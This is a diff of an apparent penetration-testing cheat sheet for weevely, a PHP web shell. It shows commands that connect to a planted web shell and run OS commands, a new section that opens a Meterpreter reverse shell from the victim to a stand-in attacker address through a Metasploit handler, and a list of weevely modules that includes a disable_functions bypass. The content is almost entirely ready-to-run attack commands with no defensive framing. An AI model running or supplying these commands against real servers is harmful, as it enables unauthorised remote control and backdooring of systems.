@@ -19,8 +19,22 @@ weevely http://xxx.xxx.xxx.xxx/weevley.php 1234
 # weevely http://xxx.xxx.xxx.xxx/<outputfile.php> <password> <os-command>
 
 weevely http://xxx.xxx.xxx.xxx/weevley.php 1234 whoami
+```
 
-# useful coammnds
+
+Get meterpreter shell
+-------------------------
+```bash
+# On attacker run
+msfconsole -x "use exploit/multi/handler; set PAYLOAD php/meterpreter/reverse_tcp; set LHOST <attacker.ip.address>; set PORT 1234; run"
+# On Victim run
+:backdoor_meterpreter -payload php/meterpreter/reverse_tcp -lhost <attacker.ip.address> -port 1234
+```
+
+
+Useful coammnds
+------------------
+```bash
 :audit_filesystem             Audit the file system for weak permissions.                          
 :audit_phpconf                Audit PHP configuration.                                             
 :audit_disablefunctionbypass  Bypass disable_function restrictions with mod_cgi and .htaccess.     
